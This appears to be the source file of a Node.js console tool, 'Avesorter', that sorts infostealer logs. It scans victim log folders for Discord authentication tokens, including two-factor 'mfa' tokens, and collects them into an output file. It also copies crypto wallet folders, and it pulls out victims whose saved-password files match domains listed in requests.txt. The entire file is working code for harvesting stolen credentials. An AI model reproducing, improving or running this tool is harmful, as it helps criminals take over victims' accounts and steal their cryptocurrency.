const fs = require('fs');
const fs2 = require('fs-extra');
const colors = require('colors');
const glob = require('glob');
const prompts = require('prompts');

const langlist = require('./../lang.json');
const check_folder = './logs';
const results_folder = './results';
let files = glob.sync(`./logs/**/Discord/**/*.l**`);
let files2 = glob.sync(`./logs/**/Discord/*okens.txt`);
let version = "0.4";

let cryptofolders = ["Crypto Wallet", "Crypto Wallets", "Coins", "cryptocurrency", "Wallets", "coldwallets", "crypto"];
let zxc = [];

let lang = false;

module.exports = {
    setlang: function (lang_select) {
        lang = lang_select;
    },

    logo: function () {
        console.clear();
        console.log('');
        console.log(`${`  ▄▀█ █ █ █▀▀ █▀ █▀█ █▀█ ▀█▀ █▀▀ █▀█ `.brightBlue}${langlist[lang][0].brightYellow}                                ${`v`.grey}${version.grey}`);
        console.log(`${`  █▀█ ▀▄▀ ██▄ ▄█ █▄█ █▀▄  █  ██▄ █▀▄ `.brightBlue}${langlist[lang][1].brightRed}`);
        console.log('');
        console.log('');
    },

    dev_logo: function () {
        console.log('');
        console.log(`
        ───────────────────────────────────────
        ───▐▀▄───────▄▀▌───▄▄▄▄▄▄▄─────────────
        ───▌▒▒▀▄▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
        ──▐▒▒▒▒▀▒▀▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
        ──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
        ▀█▒▒▒█▌▒▒█▒▒▐█▒▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
        ▀▌▒▒▒▒▒▒▀▒▀▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
        ▐▒▒▒▒▒▒▒▒ ${langlist[lang][2].brightRed} ▒▒▒▒▒▒▒▒▒█▒█▀─
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▀───
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌────
        ─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
        ─▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
        ──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
        ──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
        ────▀▄▄▀▀▀▀▀▄▄▀▀▀▀▀▀▀▄▄▀▀▀▀▀▄▄▀────────
        `);
        console.log('');
        console.log('');
    },

    clear_prev: function () {
        return new Promise(async (resolve, reject) => {
            const menu = await prompts([
                {
                    type: 'select',
                    name: 'text',
                    message: langlist[lang][11],
                    choices: [
                        { title: langlist[lang][9], value: true },
                        { title: langlist[lang][10], value: false }
                    ],
                    hint: langlist[lang][8]
                }
            ]);

            switch (menu.text) {
                case true:
                    fs2.emptyDirSync(results_folder);
                    resolve("Ok");
                    break;
                case false:
                    console.clear();
                    this.logo();
                    console.log('$'.cyan, langlist[lang][3]);
                    setTimeout(() => {
                        resolve("Ok")
                    }, 1000);
                    break;
                default:
                    console.clear();
                    this.logo();
                    console.log(` ${langlist[lang][4].bgRed}${langlist[lang][5].cyan}`);
                    console.log('');
                    break;
            }
        });
    },

    text_show: function () {
        return new Promise((resolve, reject) => {
            this.logo();
            console.log('$'.cyan, langlist[lang][6]);
            console.log('');
            fs.readFile('requests.txt', 'utf8', function (err, data) {
                const zapros = data.toString().split('\n').toString().split('\r,');
                console.log('', zapros);
                console.log('');
                console.log('');
                resolve("Ok");
            });
        });
    },

    copyFile: async function (request, result, check_folder) {
        try {
            await fs2.copy(`${check_folder}/${result}/`, `results/${request}/${result}/`);
            console.log(` [${request}]`, `${result}`.cyan, langlist[lang][7].brightGreen);
        }

        catch (err) {
            console.error(err)
        }
    },

    crypto: function () {
        return new Promise(async (resolve, reject) => {
            let data = glob.sync(`${check_folder}/**/`)
            for (cycling_data of data) {
                for (cycling_cryptofolders of cryptofolders) {
                    let gitler = fs.existsSync(`${cycling_data}${cycling_cryptofolders}/`);
                    if (gitler == true) {
                        let tempstring = cycling_data.split(`${check_folder}/`)[1];
                        let cryptoresult = tempstring.substring(0, tempstring.search('/'));
                        await fs2.copy(`${cycling_data}/`, `results/Crypto/${cryptoresult}/`);
                        console.log(` [Crypto]`, `${cryptoresult}`.cyan, langlist[lang][7].brightGreen);
                    }
                }
            }
            resolve("Ok");
        });
    },

    discord_ldb: function () {
        if (!files.length) {
            return new Promise(async (resolve, reject) => {
                this.discord_txt();
                resolve("Ok");
            });
        }

        else {
            return new Promise(async (resolve, reject) => {
                for (let i = 0; i < files.length; i++) {
                    let data = fs.readFileSync(files[i], 'utf-8');
                    var tempdata = (data.indexOf('oken'));
                    var res1 = data.indexOf('"', tempdata);
                    var result_check = data.substr(res1 + 60, 1);
                    if (result_check == '"') {
                        var result = data.substr(res1 + 1, 59);
                        var symbol_check = data.substr(res1 + 1, 1);
                        if (symbol_check.match(/[A-Z^\d]/) !== null) {
                            zxc.push(result);
                        }
                    }
                    else {
                        mfa_result_check = data.substr(res1 + 89, 1);
                        if (mfa_result_check == '"') {
                            var mfa_symbol_check = data.substr(res1 + 1, 3);
                            if (mfa_symbol_check.match('mfa') !== null) {
                                var mfa_result = data.substr(res1 + 1, 88);
                                zxc.push(mfa_result);
                            }
                        }
                    }
                }
                this.discord_txt();
                resolve("Ok");
            });
        }
    },

    discord_txt: function () {
        if (!files2.length) {
            if (!zxc.length) {
                console.log('');
                console.log(`$`.cyan, `${langlist[lang][18]}${check_folder}${langlist[lang][19]}`);
                console.log('');
                console.log('');
            }
        }

        else {
            return new Promise(async (resolve, reject) => {
                for (let i = 0; i < files2.length; i++) {
                    let data2 = fs.readFileSync(files2[i], 'utf-8');
                    let temping = data2.toString().split('\n').toString().split('\r,');
                    for (temping_sex of temping) {
                        let symbol_check2 = temping_sex.substr(0, 1);
                        if (symbol_check2.match(/([^a-z\s\d])/) !== null) {
                            zxc.push(temping_sex);
                        }

                        else {
                            let mfa_symbol_check2 = temping_sex.substr(0, 3);
                            if (mfa_symbol_check2.match('mfa') !== null) {
                                zxc.push(temping_sex);
                            }
                        }
                    }
                }
                resolve("Ok");
            });
        }
    },

    tokens_filter: function () {
        return new Promise(async (resolve, reject) => {
            var filtered_zxc = zxc.filter(function (el) {
                return el != null;
            });

            uniq_zxc = filtered_zxc.filter(function (item, pos) {
                return filtered_zxc.indexOf(item) == pos;
            })

            for (writing_zxc of uniq_zxc) {
                fs.appendFile(`${results_folder}/Discord/output_tokens.txt`, `${writing_zxc}\n`, function (err) {
                    if (err) {
                        return err;
                    }
                });
                console.log(` [Discord]`, `${writing_zxc}`.cyan, langlist[lang][7].brightGreen);
            }
            resolve("Ok");
        });
    },

    main: function () {
        return new Promise(async (resolve, reject) => {
            /*
            const mainaction = await prompts([
                {
                    type: 'select',
                    name: 'text',
                    message: langlist[lang][12],
                    choices: [
                        { title: langlist[lang][13], value: 1 },
                        { title: langlist[lang][15], value: 2 }
                    ],
                    hint: langlist[lang][8]
                }
            ]);
            console.clear();
            this.logo();
            console.log('$'.cyan, `${langlist[lang][16]}${mainaction.text}`);
            console.log('');
            */

            switch (parseInt(1)) {
                case 1:
                    setTimeout(async () => {
                        // randomshit();
                        const content = fs.readFileSync('requests.txt');
                        const zapros = content.toString().split('\n').map(a => a.trimEnd());
                        let zxcfiles = glob.sync(`${check_folder}/**/**/*assword*.txt`);
                        if (parseInt(zxcfiles.length) <= 0) {
                            console.log('');
                            console.log(`$`.cyan, `${langlist[lang][18]}${check_folder}${langlist[lang][19]}`);
                            console.log('');
                            console.log('');
                        }
                        else {
                            const saving = await prompts([
                                {
                                    type: 'select',
                                    name: 'text',
                                    message: langlist[lang][21],
                                    choices: [
                                        { title: langlist[lang][9], value: 'y' },
                                        { title: langlist[lang][10], value: 'n' },
                                        { title: langlist[lang][22], value: 'do' }
                                    ],
                                    hint: langlist[lang][8]
                                }
                            ]);

                            switch (saving.text) {
                                case 'biber':
                                    this.crypto();
                                    break;
                                case 'y':
                                    setTimeout(async () => {
                                        fs.mkdirSync(`${results_folder}/Discord/`);
                                        fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
                                        console.log('');
                                        const crypto = await prompts([
                                            {
                                                type: 'select',
                                                name: 'text',
                                                message: langlist[lang][25],
                                                choices: [
                                                    { title: langlist[lang][9], value: 'yc' },
                                                    { title: langlist[lang][10], value: 'nc' },
                                                    { title: langlist[lang][26], value: 'doc' }
                                                ],
                                                hint: langlist[lang][8]
                                            }
                                        ]);

                                        switch (crypto.text) {
                                            case 'yc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.crypto().then(async (result6) => {
                                                    if (result6 == "Ok") {
                                                        this.discord_ldb().then(async (result1) => {
                                                            if (result1 == "Ok") {
                                                                this.tokens_filter().then(async (result2) => {
                                                                    if (result2 == "Ok") {
                                                                        for (folderpath of zxcfiles) {
                                                                            let data = fs.readFileSync(folderpath, 'utf8');
                                                                            for (request of zapros) {
                                                                                if (data.includes(request)) {
                                                                                    let tempstring = folderpath.split(`${check_folder}/`)[1];
                                                                                    let result = tempstring.substring(0, tempstring.search('/'));
                                                                                    await this.copyFile(request, result, check_folder);
                                                                                }
                                                                            }
                                                                        }
                                                                        setTimeout(() => {
                                                                            console.log('');
                                                                            console.log('');
                                                                            console.log('$'.cyan, langlist[lang][24], langlist[lang][20].black.bgCyan);
                                                                            console.log('');
                                                                            console.log('');
                                                                        }, 1000);
                                                                    }
                                                                });
                                                            }
                                                        });
                                                    }
                                                });
                                                break;
                                            case 'nc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.discord_ldb().then(async (result1) => {
                                                    if (result1 == "Ok") {
                                                        this.tokens_filter().then(async (result2) => {
                                                            if (result2 == "Ok") {
                                                                for (folderpath of zxcfiles) {
                                                                    let data = fs.readFileSync(folderpath, 'utf8');
                                                                    for (request of zapros) {
                                                                        if (data.includes(request)) {
                                                                            let tempstring = folderpath.split(`${check_folder}/`)[1];
                                                                            let result = tempstring.substring(0, tempstring.search('/'));
                                                                            await this.copyFile(request, result, check_folder);
                                                                        }
                                                                    }
                                                                }
                                                                setTimeout(() => {
                                                                    console.log('');
                                                                    console.log('');
                                                                    console.log('$'.cyan, langlist[lang][24], langlist[lang][20].black.bgCyan);
                                                                    console.log('');
                                                                    console.log('');
                                                                }, 1000);
                                                            }
                                                        });
                                                    }
                                                });
                                                break;
                                            case 'doc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.crypto().then(async (result4) => {
                                                    if (result4 == "Ok") {
                                                        setTimeout(() => {
                                                            console.log('');
                                                            console.log('');
                                                            console.log('$'.cyan, langlist[lang][24], langlist[lang][20].black.bgCyan);
                                                            console.log('');
                                                            console.log('');
                                                        }, 1000);
                                                    }
                                                });
                                                break;
                                        }
                                    }, 1000);
                                    break;
                                case 'n':
                                    console.log('');
                                    setTimeout(async () => {
                                        const crypto = await prompts([
                                            {
                                                type: 'select',
                                                name: 'text',
                                                message: langlist[lang][25],
                                                choices: [
                                                    { title: langlist[lang][9], value: 'yc' },
                                                    { title: langlist[lang][10], value: 'nc' },
                                                    { title: langlist[lang][26], value: 'doc' }
                                                ],
                                                hint: langlist[lang][8]
                                            }
                                        ]);

                                        switch (crypto.text) {
                                            case 'yc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.crypto().then(async (result1) => {
                                                    if (result1 == "Ok") {
                                                        for (folderpath of zxcfiles) {
                                                            let data = fs.readFileSync(folderpath, 'utf8');
                                                            for (request of zapros) {
                                                                if (data.includes(request)) {
                                                                    let tempstring = folderpath.split(`${check_folder}/`)[1];
                                                                    let result = tempstring.substring(0, tempstring.search('/'));
                                                                    await this.copyFile(request, result, check_folder);
                                                                }
                                                            }
                                                        }
                                                        setTimeout(() => {
                                                            console.log('');
                                                            console.log('');
                                                            console.log('$'.cyan, langlist[lang][24], langlist[lang][20].black.bgCyan);
                                                            console.log('');
                                                            console.log('');
                                                        }, 1000);
                                                    }
                                                });
                                                break;
                                            case 'nc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.discord_ldb().then(async (result1) => {
                                                    if (result1 == "Ok") {
                                                        this.tokens_filter().then(async (result2) => {
                                                            if (result2 == "Ok") {
                                                                for (folderpath of zxcfiles) {
                                                                    let data = fs.readFileSync(folderpath, 'utf8');
                                                                    for (request of zapros) {
                                                                        if (data.includes(request)) {
                                                                            let tempstring = folderpath.split(`${check_folder}/`)[1];
                                                                            let result = tempstring.substring(0, tempstring.search('/'));
                                                                            await this.copyFile(request, result, check_folder);
                                                                        }
                                                                    }
                                                                }
                                                                setTimeout(() => {
                                                                    console.log('');
                                                                    console.log('');
                                                                    console.log('$'.cyan, langlist[lang][24], langlist[lang][20].black.bgCyan);
                                                                    console.log('');
                                                                    console.log('');
                                                                }, 1000);
                                                            }
                                                        });
                                                    }
                                                });
                                                break;
                                            case 'doc':
                                                console.clear();
                                                this.logo();
                                                console.log('');
                                                console.log('');
                                                console.log('', langlist[lang][17].black.bgWhite);
                                                console.log('');
                                                this.crypto().then(async(result5) => {
                                                    if (result5 == "Ok") {
                                                        setTimeout(() => {
                                                            console.log('');
                                                            console.log('');
                                                            console.log('$'.cyan, langlist[lang][23], langlist[lang][20].black.bgCyan);
                                                            console.log('');
                                                            console.log('');
                                                        }, 1000);
                                                    }
                                                });
                                                break;
                                        }
                                    }, 1000);
                                    break;
                                case 'do':
                                    setTimeout(() => {
                                        fs.mkdirSync(`${results_folder}/Discord/`);
                                        fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
                                        console.clear();
                                        this.logo();
                                        console.log('$'.cyan, ` ${langlist[lang][16]}${mainaction.text}`);
                                        console.log('');
                                        console.log('');
                                        console.log('', langlist[lang][17].black.bgWhite);
                                        console.log('');
                                        this.discord_ldb().then(async (result1) => {
                                            if (result1 == "Ok") {
                                                this.tokens_filter()
                                                setTimeout(() => {
                                                    console.log('');
                                                    console.log('');
                                                    console.log('$'.cyan, langlist[lang][23], langlist[lang][20].black.bgCyan);
                                                    console.log('');
                                                    console.log('');
                                                }, 1000);
                                            }
                                        });
                                    }, 1000);
                            }
                        }
                    }, 1000);
                    break;
                case 2:
                    this.logo();
                    this.dev_logo();
                    console.log('$'.cyan, langlist[lang][21], langlist[lang][20].black.bgCyan);
                    console.log('');
                    console.log('');
                    break;
                case 3:
                    this.logo();
                    this.dev_logo();
                    console.log('$'.cyan, langlist[lang][21], langlist[lang][20].black.bgCyan);
                    console.log('');
                    console.log('');
                    break;
                default:
                    this.logo();
                    this.dev_logo();
                    break;
            }
        });
    }
}
